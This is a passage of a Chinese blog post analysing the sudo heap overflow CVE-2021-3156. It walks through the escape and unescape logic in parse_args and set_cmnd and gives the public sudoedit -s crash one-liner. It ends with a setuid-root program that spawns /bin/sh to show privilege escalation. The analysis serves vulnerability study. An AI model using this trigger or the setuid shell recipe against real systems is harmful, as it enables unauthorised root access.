<p>环境配置到最后，root权限下已经可以执行编译出的sudo了。但无论有没有设置 LD_LIBRARY_PATH，普通用户仍然执行不了编译出的sudo。普通用户执行编译出的sudo的报错如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./sudo: error <span class="keyword">while</span> loading shared libraries: libsudo_util.so.0: cannot open shared object file: No such file or directory</span><br></pre></td></tr></table></figure>
<p>既然普通用户执行不了sudo，那就先暂时用root权限调试。</p>
</li>
</ul>
<h2 id="三、漏洞细节">三、漏洞细节</h2>
<h3 id="1-parse-args-添加转义">1. parse_args 添加转义</h3>
<p>在main函数中，程序会调用<code>parse_args</code>函数以处理传入的参数。其中有一个<strong>处理转义字符</strong>的代码片段：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Command line argument parsing.</span></span><br><span class="line"><span class="comment"> * Sets nargc and nargv which corresponds to the argc/argv we'll use</span></span><br><span class="line"><span class="comment"> * for the command to be run (if we are running one).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">parse_args(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">int</span> *old_optind, <span class="keyword">int</span> *nargc, <span class="keyword">char</span> ***nargv,</span><br><span class="line">    struct sudo_settings **settingsp, <span class="keyword">char</span> ***env_addp)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * For shell mode we need to rewrite argv</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="comment">// 条件：当 mode 设置了 MODE_RUN，并且 flags 设置了 MODE_SHELL</span></span><br><span class="line">    <span class="keyword">if</span> (ISSET(mode, MODE_RUN) &amp;&amp; ISSET(flags, MODE_SHELL))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 开始构造 "shell -c &lt;command&gt;"指令</span></span><br><span class="line">        <span class="keyword">char</span> **av, *cmnd = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">int</span> ac = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (argc != <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* shell -c "command" */</span></span><br><span class="line">            <span class="keyword">char</span> *src, *dst;</span><br><span class="line">            <span class="keyword">size_t</span> cmnd_size = (<span class="keyword">size_t</span>)(argv[argc - <span class="number">1</span>] - argv[<span class="number">0</span>]) +</span><br><span class="line">                               <span class="built_in">strlen</span>(argv[argc - <span class="number">1</span>]) + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">            cmnd = dst = reallocarray(<span class="literal">NULL</span>, cmnd_size, <span class="number">2</span>);</span><br><span class="line">            <span class="comment">// ...</span></span><br><span class="line">            <span class="comment">// 开始处理传入的参数</span></span><br><span class="line">            <span class="keyword">for</span> (av = argv; *av != <span class="literal">NULL</span>; av++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">for</span> (src = *av; *src != <span class="string">'\0'</span>; src++)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">/* quote potential meta characters */</span></span><br><span class="line">                    <span class="comment">// 将一些字符转义，即如果发现 _-$ 字符，则在新构造出的&lt;command&gt;中加上 `\`</span></span><br><span class="line">                    <span class="keyword">if</span> (!<span class="built_in">isalnum</span>((<span class="keyword">unsigned</span> <span class="keyword">char</span>)*src) &amp;&amp; *src != <span class="string">'_'</span> &amp;&amp; *src != <span class="string">'-'</span> &amp;&amp; *src != <span class="string">'$'</span>)</span><br><span class="line">                        *dst++ = <span class="string">'\\'</span>;</span><br><span class="line">                    *dst++ = *src;</span><br><span class="line">                &#125;</span><br><span class="line">                *dst++ = <span class="string">' '</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (cmnd != dst)</span><br><span class="line">                dst--; <span class="comment">/* replace last space with a NUL */</span></span><br><span class="line">            *dst = <span class="string">'\0'</span>;</span><br><span class="line"></span><br><span class="line">            ac += <span class="number">2</span>; <span class="comment">/* -c cmnd */</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        av = reallocarray(<span class="literal">NULL</span>, ac + <span class="number">1</span>, <span class="keyword">sizeof</span>(<span class="keyword">char</span> *));</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">        av[<span class="number">0</span>] = (<span class="keyword">char</span> *)user_details.shell; <span class="comment">/* plugin may override shell */</span></span><br><span class="line">        <span class="keyword">if</span> (cmnd != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            av[<span class="number">1</span>] = <span class="string">"-c"</span>;</span><br><span class="line">            av[<span class="number">2</span>] = cmnd;</span><br><span class="line">        &#125;</span><br><span class="line">        av[ac] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">        argv = av;</span><br><span class="line">        argc = ac;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当程序设置了 MODE_RUN 和 MODE_SHELL 标志后，控制流就会进入内部代码，构造 <code>shell -c &lt;command&gt;</code>指令，并在其中处理<code>&lt;command&gt;</code>中的一些转义字符，在这些转义字符前添加反斜杠。</p>
<p>若执行 sudo 时设置了 <code>-s</code> 或<code>-i</code>参数，则在<code>parse_args</code>函数中将会同时设置 MODE_RUN 和 MODE_SHELL 标志：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">parse_args(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">int</span> *old_optind, <span class="keyword">int</span> *nargc, <span class="keyword">char</span> ***nargv,</span><br><span class="line">    struct sudo_settings **settingsp, <span class="keyword">char</span> ***env_addp)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* XXX - should fill in settings at the end to avoid dupes */</span></span><br><span class="line">    <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Some trickiness is required to allow environment variables</span></span><br><span class="line"><span class="comment">         * to be interspersed with command line options.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> ((ch = getopt_long(argc, argv, short_opts, long_opts, <span class="literal">NULL</span>)) != <span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">switch</span> (ch)</span><br><span class="line">            &#123;</span><br><span class="line">            <span class="comment">// ...</span></span><br><span class="line">            <span class="keyword">case</span> <span class="string">'i'</span>:</span><br><span class="line">                sudo_settings[ARG_LOGIN_SHELL].value = <span class="string">"true"</span>;</span><br><span class="line">                <span class="comment">// 设置 MODE_LOGIN_SHELL</span></span><br><span class="line">                SET(flags, MODE_LOGIN_SHELL);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="comment">// ...</span></span><br><span class="line">            <span class="keyword">case</span> <span class="string">'s'</span>:</span><br><span class="line">                sudo_settings[ARG_USER_SHELL].value = <span class="string">"true"</span>;</span><br><span class="line">                <span class="comment">// 设置 flags 为 MODE_SHELL.</span></span><br><span class="line">                SET(flags, MODE_SHELL);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="comment">// ...</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">if</span> (!mode)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* Defer -k mode setting until we know whether it is a flag or not */</span></span><br><span class="line">        <span class="keyword">if</span> (sudo_settings[ARG_IGNORE_TICKET].value != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (argc == <span class="number">0</span> &amp;&amp; !(flags &amp; (MODE_SHELL | MODE_LOGIN_SHELL)))</span><br><span class="line">            &#123;</span><br><span class="line">                mode = MODE_INVALIDATE; <span class="comment">/* -k by itself */</span></span><br><span class="line">                sudo_settings[ARG_IGNORE_TICKET].value = <span class="literal">NULL</span>;</span><br><span class="line">                valid_flags = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 如果 mode 运行到现在都还没有设置，则默认设置为 MODE_RUN</span></span><br><span class="line">        <span class="keyword">if</span> (!mode)</span><br><span class="line">            mode = MODE_RUN; <span class="comment">/* running a command */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// 如果设置了 MODE_LOGIN_SHELL</span></span><br><span class="line">    <span class="keyword">if</span> (ISSET(flags, MODE_LOGIN_SHELL))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">        <span class="comment">// 则继续设置 MODE_SHELL</span></span><br><span class="line">        SET(flags, MODE_SHELL);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样就可以成功进入处理转义字符的代码片段。</p>
<h3 id="2-set-cmnd-取消转义">2. set_cmnd 取消转义</h3>
<p>当程序执行完<code>parse_args</code>后，沿以下调用链最终调用到<code>set_cmnd</code>函数：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[], <span class="keyword">char</span> *envp[])</span></span></span><br><span class="line"><span class="function">    <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">policy_check</span><span class="params">(...)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">sudoers_policy_check</span><span class="params">(...)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">int</span> <span class="title">sudoers_policy_main</span><span class="params">(...)</span></span></span><br><span class="line"><span class="function">                <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">set_cmnd</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br></pre></td></tr></table></figure>
<p>需要注意的是，只有在 parse_args 函数返回的 sudo_mode 设置了 MODE_RUN，才会调用 policy_check 函数，这是整条调用链上唯一的条件判断。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">main(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[], <span class="keyword">char</span> *envp[])</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">/* Parse command line arguments. */</span></span><br><span class="line">    sudo_mode = parse_args(argc, argv, &amp;submit_optind, &amp;nargc, &amp;nargv,</span><br><span class="line">                           &amp;settings, &amp;env_add);</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">switch</span> (sudo_mode &amp; MODE_MASK)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">case</span> MODE_RUN:</span><br><span class="line">        policy_check(nargc, nargv, env_add, &amp;command_info, &amp;argv_out,</span><br><span class="line">                     &amp;user_env_out);</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在 set_cmnd 函数中，如果<strong>同时满足</strong>以下三个条件，则程序将会<strong>取消参数中的转义</strong>：</p>
<ul>
<li>sudo_mode 设置了 MODE_RUN | MODE_EDIT | MODE_CHECK。</li>
<li>NewArgc &gt; 1，即待执行程序的参数个数。</li>
<li>sudo_mode 还设置了 MODE_SHELL | MODE_LOGIN_SHELL。</li>
</ul>
<p>具体代码见如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Fill in user_cmnd, user_args, user_base and user_stat variables</span></span><br><span class="line"><span class="comment"> * and apply any command-specific defaults entries.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">set_cmnd(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// MODE 条件1</span></span><br><span class="line">    <span class="keyword">if</span> (sudo_mode &amp; (MODE_RUN | MODE_EDIT | MODE_CHECK))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">        <span class="comment">/* set user_args */</span></span><br><span class="line">        <span class="keyword">if</span> (NewArgc &gt; <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> *to, *from, **av;</span><br><span class="line">            <span class="keyword">size_t</span> size, n;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* Alloc and build up user_args. */</span></span><br><span class="line">            <span class="keyword">for</span> (size = <span class="number">0</span>, av = NewArgv + <span class="number">1</span>; *av; av++)</span><br><span class="line">                size += <span class="built_in">strlen</span>(*av) + <span class="number">1</span>;</span><br><span class="line">            <span class="comment">// ...</span></span><br><span class="line">            <span class="comment">// MODE 条件2</span></span><br><span class="line">            <span class="keyword">if</span> (ISSET(sudo_mode, MODE_SHELL | MODE_LOGIN_SHELL))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">/*</span></span><br><span class="line"><span class="comment">                 * When running a command via a shell, the sudo front-end</span></span><br><span class="line"><span class="comment">                 * escapes potential meta chars.  We unescape non-spaces</span></span><br><span class="line"><span class="comment">                 * for sudoers matching and logging purposes.</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                <span class="comment">// 遍历传入的参数。</span></span><br><span class="line">                <span class="keyword">for</span> (to = user_args, av = NewArgv + <span class="number">1</span>; (from = *av); av++)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">while</span> (*from)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="comment">// 如果识别出了反斜杠，则跳过第一个反斜杠，只复制二个反斜杠</span></span><br><span class="line">                        <span class="comment">// 例如 \$ 只复制 $</span></span><br><span class="line">                        <span class="comment">// 注意！该代码默认假设原先传入sudo的参数已经被转义。</span></span><br><span class="line">                        <span class="keyword">if</span> (from[<span class="number">0</span>] == <span class="string">'\\'</span> &amp;&amp; !<span class="built_in">isspace</span>((<span class="keyword">unsigned</span> <span class="keyword">char</span>)from[<span class="number">1</span>]))</span><br><span class="line">                            from++;</span><br><span class="line">                        *to++ = *from++;</span><br><span class="line">                    &#125;</span><br><span class="line">                    *to++ = <span class="string">' '</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                *--to = <span class="string">'\0'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// ...</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="3-漏洞触发">3. 漏洞触发</h3>
<h4 id="a-具体细节">a. 具体细节</h4>
<p>由于 set_cmnd 函数的执行会<strong>基于原先传入sudo的参数已经在 parse_args 中被转义</strong>的前提下，因此如果传入的参数是以<strong>单个反斜杠</strong>结尾，则在取消转义的循环中，将会产生以下影响：</p>
<ul>
<li>from[0] 为反斜杠，但from[1] 是传入参数的 NULL byte。</li>
<li>由于满足<code>from[0] == '\\' &amp;&amp; !isspace((unsigned char)from[1])</code>，因此from指针向下移动 1 byte，指向参数的NULL byte。</li>
<li>执行 <code>*to++ = *from++</code>，将 NULL byte 复制到 user_args 堆数组中，同时 from 指针继续向下移动，指向 NULL byte的下一个字节位置（注意此时已经超出了参数的范围）。</li>
<li>如果此时 from 指向的不是NULL byte，那就继续循环<strong>越界写入</strong>数据至 user_args 堆数组中。</li>
</ul>
<p>但通常我们是没有办法传入一个<strong>单反斜杠</strong>进入 set_cmnd 函数中，因为在 parse_args 函数中，若 MODE_SHELL 或 MODE_LOGIN_SHELL 标志被设置，那么所有的转义字符将在 parse_args 函数中被转义，包括反斜杠。 （MODE_RUN 默认已经设置）。</p>
<p>但实际上，set_cmnd 中取消转义的条件判断与 parse_args 函数中添加转义的条件判断有所不同。</p>
<table>
<thead>
<tr>
<th style="text-align:center">Functions</th>
<th style="text-align:center">Mode Comditions</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">parse_args</td>
<td style="text-align:center">MODE_RUN &amp;&amp; MODE_SHELL</td>
</tr>
<tr>
<td style="text-align:center">set_cmnd</td>
<td style="text-align:center">(MODE_RUN | MODE_EDIT | MODE_CHECK) &amp;&amp; (MODE_SHELL | MODE_LOGIN_SHELL)</td>
</tr>
</tbody>
</table>
<p>那么我们能否绕过 parse_args 的添加转义操作，并到达 set_cmnd 的取消转义操作呢？即，能否在设置 MODE_SHELL 标志的前提下，取消 MODE_RUN 标志，但又设置了 MODE_EDIT 或 MODE_CHECK，使得可以绕过添加转义操作，并成功执行取消转义操作？</p>
<blockquote>
<p>上面说的条件有点绕，总结一下就是这样</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">MODE_SHELL &amp;&amp; !MODE_RUN  &amp;&amp; (MODE_EDIT || MODE_CHECK)</span><br></pre></td></tr></table></figure>
</blockquote>
<p>答案似乎是否定的，因为如果我们直接给 sudo 传入<code>-l</code>或<code>-e</code>参数，则 valid_flags 标志将会设置为 MODE_NONINTERACTIVE 或 MODE_LONG_LIST。</p>
<p>而此时的 flags 标志为 MODE_SHELL 或 MODE_LOGIN_SHELL，因此使得我们无法绕过一个特殊的判断条件：<code>flags &amp; valid_flags) != flags</code>。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">parse_args(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">int</span> *old_optind, <span class="keyword">int</span> *nargc, <span class="keyword">char</span> ***nargv,</span><br><span class="line">    struct sudo_settings **settingsp, <span class="keyword">char</span> ***env_addp)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((ch = getopt_long(argc, argv, short_opts, long_opts, <span class="literal">NULL</span>)) != <span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">switch</span> (ch)</span><br><span class="line">            &#123;</span><br><span class="line">            <span class="comment">// ...</span></span><br><span class="line">            <span class="keyword">case</span> <span class="string">'e'</span>:</span><br><span class="line">                <span class="keyword">if</span> (mode &amp;&amp; mode != MODE_EDIT)</span><br><span class="line">                    usage_excl();</span><br><span class="line">                <span class="comment">// 设置 mode 为 MODE_EDIT</span></span><br><span class="line">                mode = MODE_EDIT;</span><br><span class="line">                sudo_settings[ARG_SUDOEDIT].value = <span class="string">"true"</span>;</span><br><span class="line">                valid_flags = MODE_NONINTERACTIVE;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="comment">// ...</span></span><br><span class="line">            <span class="keyword">case</span> <span class="string">'l'</span>:</span><br><span class="line">                <span class="keyword">if</span> (mode)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span> (mode == MODE_LIST)</span><br><span class="line">                        SET(flags, MODE_LONG_LIST);</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                        usage_excl();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 设置 mode 为 MODE_LIST</span></span><br><span class="line">                mode = MODE_LIST;</span><br><span class="line">                valid_flags = MODE_NONINTERACTIVE | MODE_LONG_LIST;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="comment">// ...</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// 在此处将 MODE_LIST 更新为 MODE_CHECK</span></span><br><span class="line">    <span class="keyword">if</span> (argc &gt; <span class="number">0</span> &amp;&amp; mode == MODE_LIST)</span><br><span class="line">        mode = MODE_CHECK;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// 必须绕过的特殊判断条件</span></span><br><span class="line">    <span class="keyword">if</span> ((flags &amp; valid_flags) != flags)</span><br><span class="line">        usage();</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但天无绝人之路，如果 sudo 是以 sudoedit 启动的（注意 sudoedit 是一个符号链接，直接指向 /bin/sudo），那么就可以在<strong>不修改 valid_flags 的前提下，设置 mode 为 MODE_EDIT</strong>：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Default flags allowed when running a command.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEFAULT_VALID_FLAGS (MODE_BACKGROUND | MODE_PRESERVE_ENV | MODE_RESET_HOME | MODE_LOGIN_SHELL | MODE_NONINTERACTIVE | MODE_SHELL)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">parse_args(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">int</span> *old_optind, <span class="keyword">int</span> *nargc, <span class="keyword">char</span> ***nargv,</span><br><span class="line">    struct sudo_settings **settingsp, <span class="keyword">char</span> ***env_addp)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">int</span> valid_flags = DEFAULT_VALID_FLAGS;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* First, check to see if we were invoked as "sudoedit". */</span></span><br><span class="line">    <span class="comment">// 如果以 sudoedit 打开</span></span><br><span class="line">    proglen = <span class="built_in">strlen</span>(progname);</span><br><span class="line">    <span class="keyword">if</span> (proglen &gt; <span class="number">4</span> &amp;&amp; <span class="built_in">strcmp</span>(progname + proglen - <span class="number">4</span>, <span class="string">"edit"</span>) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        progname = <span class="string">"sudoedit"</span>;</span><br><span class="line">        <span class="comment">// 则设置 mode 为 MODE_EDIT</span></span><br><span class="line">        mode = MODE_EDIT;</span><br><span class="line">        <span class="comment">// 注意之后就没有再设置 valid_flags了</span></span><br><span class="line">        sudo_settings[ARG_SUDOEDIT].value = <span class="string">"true"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 必须绕过的特殊判断条件</span></span><br><span class="line">    <span class="keyword">if</span> ((flags &amp; valid_flags) != flags)</span><br><span class="line">        usage();</span><br><span class="line">   <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而 valid_flags 的默认值中设置了 MODE_SHELL 以及 MODE_LOGIN_SHELL ，因此可以通过该判断条件。</p>
<blockquote>
<p>所以最后，我们可以：</p>
<ul>
<li><strong>绕过</strong> parse_args 的<strong>添加</strong>转义操作。</li>
<li><strong>进入</strong> set_cmnd 的<strong>取消</strong>转义操作。</li>
</ul>
<p>并最终越界写入数据至堆数组 user_args。</p>
</blockquote>
<p>这个漏洞相当的理想，因为它可以使得：</p>
<ul>
<li>
<p><strong>user_args 堆内存长度可控</strong>。因为 user_args的长度取决于传入 sudoedit 的参数长度：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 该代码片段位于 set_cmnd 函数中</span></span><br><span class="line"><span class="comment">/* Alloc and build up user_args. */</span></span><br><span class="line"><span class="keyword">for</span> (size = <span class="number">0</span>, av = NewArgv + <span class="number">1</span>; *av; av++)</span><br><span class="line">    size += <span class="built_in">strlen</span>(*av) + <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong>越界写入的数据可控</strong>。因为存放传入 sudoedit 参数的内存位置与环境变量紧紧相临，因此我们可以通过<strong>指定特定环境变量</strong>来控制越界写入的数据：</p>
<p><img src="/2021/01/CVE-2021-3156/args_envs.png" alt="img"></p>
</li>
<li>
<p><strong>可以用单个反斜杠来写入单个NULL byte</strong>，具体请阅读上面的触发过程。</p>
</li>
</ul>
<h4 id="b-POC">b. POC</h4>
<p>Qualys漏洞团队给出了一个非常精简的POC，该 POC 可以触发 malloc 的 corrupt。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 执行指令</span></span><br><span class="line">sudoedit -s <span class="string">'\'</span> `perl -e <span class="string">'print "A" x 65536'</span>`</span><br><span class="line"><span class="comment"># 程序输出</span></span><br><span class="line">malloc(): corrupted top size</span><br><span class="line">[1]    411260 abort      sudoedit -s <span class="string">'\'</span> `perl -e <span class="string">'print "A" x 65536'</span>`</span><br></pre></td></tr></table></figure>
<p>可以看到这个 POC 满足我们刚刚所分析的那样：</p>
<ul>
<li>使用 sudoedit 设置 MODE_EDIT 标志</li>
<li>使用 <code>-s</code> 参数设置 MODE_SHELL 标志</li>
<li>后面带的参数中，有个参数以<strong>单个反斜杠</strong>结尾</li>
</ul>
<p>因此可以触发 crash。</p>
<blockquote>
<p>根据 Qualys 漏洞团队披露出的 exploit 构造细节（详见第二条参考连接），最少有三种构造 exp 的方式。但笔者调试时发现这其中存在一些问题：</p>
<ul>
<li>
<p>如果以第一种方式来越界写入<strong>将近 0x1000 个字节的数据</strong>至对应堆内存上，来覆盖函数指针，则在<strong>越界写入内存</strong>至<strong>使用函数指针</strong>的这个过程上，存在<strong>解引用被覆盖内存上的指针</strong>的操作，这将导致程序崩溃，且没有办法绕过。</p>
</li>
<li>
<p>如果以第二种方式来试图越界写入内存至 service_user 结构。由于 user_args 堆数组的地址<strong>高于</strong>后分配的 service_user 结构，因此我们没有办法覆盖到该结构。</p>
<blockquote>
<p>这个问题大概率受到 glibc 版本的影响，笔者在自己非标准 glibc 上测试会出现该问题。</p>
</blockquote>
</li>
<li>
<p>第三种方法难度较大，原理较为复杂，暂时没有去研究。</p>
</li>
</ul>
<p>至于为什么 Qualys 漏洞团队可以利用成功，可能是因为其 exploit 是 fuzz 出的，即可以使 sudo 恰好达到预期的目的（例如使用函数指针 / 欲覆盖对象在 user_args 堆数组的高地址处等等）。</p>
</blockquote>
<h2 id="四、小结">四、小结</h2>
<p>该漏洞实际上是低权限用户突破高权限程序的保护，从而获取高权限的情形。</p>
<p>我们可以执行以下命令，查看 sudo 程序的权限：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ls /bin/sudo -al</span><br></pre></td></tr></table></figure>
<p>输出如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-rwsr-xr-x 1 root root 161512 Oct 29  2019 /bin/sudo</span><br></pre></td></tr></table></figure>
<p>可以看到，sudo 的 <strong>owner 是 root</strong>，<strong>权限是 <code>rws</code></strong>。<code>rwx</code>我们都知道是 可读可写可执行，但 rws 又是什么呢？</p>
<p>实际上，<code>s</code>标志代表的是 <strong>setuid标志</strong>。一个可执行文件在执行时，一般该程序<strong>只拥有调用该程序的用户</strong>具有的权限，而 setuid标志可以让普通用户以 owner 权限运行只有 owner 帐号才能运行的程序或命令。</p>
<blockquote>
<p>在 sudo 这个例子中，owner 是 <strong>root</strong>。</p>
</blockquote>
<p>因此，倘若<strong>含有 setuid 标志的软件存在漏洞</strong>，那我们就可以通过这些漏洞来<strong>获取更高权限</strong>。</p>
<p>以下是一个简单的 test case：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// test.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(setuid(<span class="number">0</span>) == <span class="number">-1</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"setuid fail\n"</span>);</span><br><span class="line">    <span class="keyword">if</span>(setgid(<span class="number">0</span>) == <span class="number">-1</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"setuid fail\n"</span>);</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>执行以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 当前为user权限</span></span><br><span class="line">g++ test.c -o <span class="built_in">test</span></span><br><span class="line">sudo chown root:root ./<span class="built_in">test</span></span><br><span class="line">sudo chmod 4755 ./<span class="built_in">test</span></span><br><span class="line">./<span class="built_in">test</span></span><br><span class="line"><span class="comment"># 新开的 /bin/sh 为 root 权限</span></span><br></pre></td></tr></table></figure>
